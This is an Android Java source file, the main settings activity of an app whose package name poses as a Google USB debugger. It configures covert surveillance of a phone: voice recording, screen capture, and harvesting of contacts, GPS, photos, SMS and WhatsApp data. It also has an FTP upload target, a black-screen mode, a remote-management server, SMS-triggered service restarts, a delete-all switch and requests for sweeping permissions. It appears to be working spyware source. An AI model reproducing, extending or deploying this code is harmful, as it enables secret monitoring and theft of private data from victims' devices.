package com.google.android.usbdebugger;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Switch;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final int PERMISSIONS_REQUEST_CODE = 123;
    private static final int MANAGE_STORAGE_REQUEST_CODE = 456;

    private EditText ftpip_text, ftpport_text, ftpuser_text, ftppass_text, ftpfolder_text;
    private EditText gps_period_text, recordCount_text, dbCount_text, xml_timer_text, audio_duration_text; 
    private Switch voice_switch, screen_switch, contacts_switch, gps_switch, dcim_switch, wasap_switch;
    private Switch blackscreen_switch, smsenable_switch, remmanserver_switch, mobilenetwork_switch, deleteAll_switch;
    private Button saveButton;

    private DBHelper dbh;
    private SQLiteDatabase db;

    private boolean hasChanges = false;
    private boolean isLoading = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initializeAndLoadUI();
    }

    private void initializeAndLoadUI() {
        dbh = new DBHelper(this);
        db = dbh.getWritableDatabase();

        initializeViews();
        loadAndDisplayParameters();
        setupChangeListeners();

        saveButton.setOnClickListener(v -> {
            saveParameters(true);
            ArrayList<String> encryptedParams = dbh.SelectParametrs(db);
            @SuppressLint("HardwareIds")
            String imei = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            if (encryptedParams != null && !encryptedParams.isEmpty()) {
                ReadXMLFile.TEST_PHP(MainActivity.this, encryptedParams, imei, "", "", "", "", 0);
            }
            restartService();
            finish();
        });

        checkAndRequestPermissions();
    }


    @Override
    protected void onPause() {
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        if (db != null && db.isOpen()) {
            db.close();
        }
        if (dbh != null) {
            dbh.close();
        }
        super.onDestroy();
    }

    private void initializeViews() {
        ftpip_text = findViewById(R.id.ftpip_text);
        ftpport_text = findViewById(R.id.ftpport_text);
        ftpuser_text = findViewById(R.id.ftpuser_text);
        ftppass_text = findViewById(R.id.ftppass_text);
        ftpfolder_text = findViewById(R.id.ftpfolder_text);
        gps_period_text = findViewById(R.id.gps_period_text);
        recordCount_text = findViewById(R.id.filecount_text);
        dbCount_text = findViewById(R.id.dbcount_text);
        xml_timer_text = findViewById(R.id.xml_timer_text);
        audio_duration_text = findViewById(R.id.audio_duration_text);
        voice_switch = findViewById(R.id.voice_switch);
        screen_switch = findViewById(R.id.screen_switch);
        contacts_switch = findViewById(R.id.contacts_switch);
        gps_switch = findViewById(R.id.gps_switch);
        dcim_switch = findViewById(R.id.dcim_switch);
        wasap_switch = findViewById(R.id.wasap_switch);
        blackscreen_switch = findViewById(R.id.blackscreen_switch);
        smsenable_switch = findViewById(R.id.smsenable_switch);
        remmanserver_switch = findViewById(R.id.remmanserver_switch);
        mobilenetwork_switch = findViewById(R.id.mobilenetwork_switch);
        deleteAll_switch = findViewById(R.id.deleteAll_switch);
        saveButton = findViewById(R.id.saveButton);
    }

    private void loadAndDisplayParameters() {
        isLoading = true;
        ArrayList<String> Params = dbh.SelectParametrs(db);

        if (Params == null || Params.size() < 22) {
            Toast.makeText(this, "Ошибка загрузки параметров из БД", Toast.LENGTH_LONG).show();
            isLoading = false;
            return;
        }

        try {
            ftpip_text.setText(EncryptDecryptStringWithAES.decrypt(Params.get(2)));
            ftpuser_text.setText(EncryptDecryptStringWithAES.decrypt(Params.get(5)));
            ftppass_text.setText(EncryptDecryptStringWithAES.decrypt(Params.get(6)));
            ftpfolder_text.setText(EncryptDecryptStringWithAES.decrypt(Params.get(4)));

            ftpport_text.setText(Params.get(3));
            gps_period_text.setText(Params.get(8));
            dbCount_text.setText(Params.get(18));
            recordCount_text.setText(Params.get(16));
            xml_timer_text.setText(Params.get(20));
            audio_duration_text.setText(Params.get(21));

            voice_switch.setChecked("1".equals(Params.get(0)));
            screen_switch.setChecked("1".equals(Params.get(1)));
            contacts_switch.setChecked("1".equals(Params.get(9)));
            gps_switch.setChecked("1".equals(Params.get(7)));
            dcim_switch.setChecked("1".equals(Params.get(11)));
            wasap_switch.setChecked("1".equals(Params.get(12)));
            blackscreen_switch.setChecked("1".equals(Params.get(13)));
            smsenable_switch.setChecked("1".equals(Params.get(14)));
            remmanserver_switch.setChecked("1".equals(Params.get(17)));
            mobilenetwork_switch.setChecked("1".equals(Params.get(15)));
            deleteAll_switch.setChecked("1".equals(Params.get(19)));

        } catch (Exception e) {
            Log.e(TAG, "Ошибка при отображении параметров: " + e.getMessage());
        }
        isLoading = false;
        hasChanges = false;
    }

    private void setupChangeListeners() {
        TextWatcher textWatcher = new TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {
                if (!isLoading) hasChanges = true;
            }
            @Override public void afterTextChanged(Editable s) {}
        };

        ftpip_text.addTextChangedListener(textWatcher);
        ftpport_text.addTextChangedListener(textWatcher);
        ftpuser_text.addTextChangedListener(textWatcher);
        ftppass_text.addTextChangedListener(textWatcher);
        ftpfolder_text.addTextChangedListener(textWatcher);
        gps_period_text.addTextChangedListener(textWatcher);
        recordCount_text.addTextChangedListener(textWatcher);
        dbCount_text.addTextChangedListener(textWatcher);
        xml_timer_text.addTextChangedListener(textWatcher);
        audio_duration_text.addTextChangedListener(textWatcher);

        voice_switch.setOnCheckedChangeListener((buttonView, isChecked) -> { if (!isLoading) hasChanges = true; });
        screen_switch.setOnCheckedChangeListener((buttonView, isChecked) -> { if (!isLoading) hasChanges = true; });
        contacts_switch.setOnCheckedChangeListener((buttonView, isChecked) -> { if (!isLoading) hasChanges = true; });
        gps_switch.setOnCheckedChangeListener((buttonView, isChecked) -> { if (!isLoading) hasChanges = true; });
        dcim_switch.setOnCheckedChangeListener((buttonView, isChecked) -> { if (!isLoading) hasChanges = true; });
        wasap_switch.setOnCheckedChangeListener((buttonView, isChecked) -> { if (!isLoading) hasChanges = true; });
        blackscreen_switch.setOnCheckedChangeListener((buttonView, isChecked) -> { if (!isLoading) hasChanges = true; });
        smsenable_switch.setOnCheckedChangeListener((buttonView, isChecked) -> { if (!isLoading) hasChanges = true; });
        remmanserver_switch.setOnCheckedChangeListener((buttonView, isChecked) -> { if (!isLoading) hasChanges = true; });
        mobilenetwork_switch.setOnCheckedChangeListener((buttonView, isChecked) -> { if (!isLoading) hasChanges = true; });
        deleteAll_switch.setOnCheckedChangeListener((buttonView, isChecked) -> { if (!isLoading) hasChanges = true; });
    }

    private void saveParameters(boolean showToast) {
        ContentValues values = new ContentValues();
        
        values.put("FT", EncryptDecryptStringWithAES.encrypt(ftpip_text.getText().toString()));
        values.put("US", EncryptDecryptStringWithAES.encrypt(ftpuser_text.getText().toString()));
        values.put("PS", EncryptDecryptStringWithAES.encrypt(ftppass_text.getText().toString()));
        values.put("FD", EncryptDecryptStringWithAES.encrypt(ftpfolder_text.getText().toString()));
        
        values.put("PT", ftpport_text.getText().toString());
        values.put("VC", voice_switch.isChecked() ? "1" : "0");
        values.put("SC", screen_switch.isChecked() ? "1" : "0");
        values.put("GP", gps_switch.isChecked() ? "1" : "0");
        values.put("GP_T", gps_period_text.getText().toString());
        values.put("CN", contacts_switch.isChecked() ? "1" : "0");
        values.put("DC", dcim_switch.isChecked() ? "1" : "0");
        values.put("PR", wasap_switch.isChecked() ? "1" : "0");
        values.put("BS", blackscreen_switch.isChecked() ? "1" : "0");
        values.put("SM", smsenable_switch.isChecked() ? "1" : "0");
        values.put("MI", mobilenetwork_switch.isChecked() ? "1" : "0");
        values.put("FLC", recordCount_text.getText().toString());
        values.put("RS", remmanserver_switch.isChecked() ? "1" : "0");
        values.put("DBC", dbCount_text.getText().toString());
        values.put("SH", deleteAll_switch.isChecked() ? "1" : "0");
        values.put("XML_T", xml_timer_text.getText().toString());
        // ИЗМЕНЕНО: AUDIO_DUR переименован в DUR
        values.put("DUR", audio_duration_text.getText().toString());

        dbh.Update(db, "Parametrs", "1=1", null, values);

        hasChanges = false;
        if (showToast) {
            Toast.makeText(this, "Параметры сохранены и отправлены на сервер!", Toast.LENGTH_SHORT).show();
        }
    }

    private void restartService() {
        Intent intent = new Intent(this, MyService.class);
        intent.putExtra("sms_body", "Restart");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    private void checkAndRequestPermissions() {
        List<String> listPermissionsNeeded = new ArrayList<>();
        String[] permissions = {
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
        };

        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(perm);
            }
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }

        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), PERMISSIONS_REQUEST_CODE);
        } else {
            checkStorageManagerPermission();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            checkStorageManagerPermission();
        }
    }

    private void checkStorageManagerPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Toast.makeText(this, "Требуется разрешение на доступ ко всем файлам", Toast.LENGTH_LONG).show();
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse(String.format("package:%s", getPackageName())));
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                    Log.e(TAG, "Не удалось открыть экран MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, используется резервный вариант.", e);
                }
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == MANAGE_STORAGE_REQUEST_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    Toast.makeText(this, "Доступ к файлам предоставлен", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Доступ к файлам НЕ предоставлен", Toast.LENGTH_LONG).show();
                }
            }
        }
    }
}
